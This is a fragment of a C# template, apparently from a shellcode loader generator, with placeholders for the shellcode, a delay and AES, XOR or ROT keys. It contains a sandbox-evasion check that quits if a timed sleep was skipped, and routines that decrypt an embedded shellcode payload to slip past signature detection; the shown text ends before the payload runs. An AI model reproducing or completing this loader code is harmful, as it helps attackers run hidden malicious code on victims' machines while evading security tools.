
#if DELAY
            DateTime t1 = DateTime.Now;
            Sleep({{DELAY}} * 1000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < {{DELAY}} - 0.5)
            {
                return;
            }
#endif

            byte[] buf = new byte[] {{SHELLCODE}};
            
#if AES
            byte[] key = new byte[] {{AES_KEY}};
            byte[] iv = new byte[] {{AES_IV}};

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV  = iv;
                aes.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    buf = decryptor.TransformFinalBlock(buf, 0, buf.Length);
                }
            }
#elif XOR
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ {{XOR_KEY}});
            }
#elif ROT
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - {{ROT_KEY}}) & 0xFF);
            }            
#endif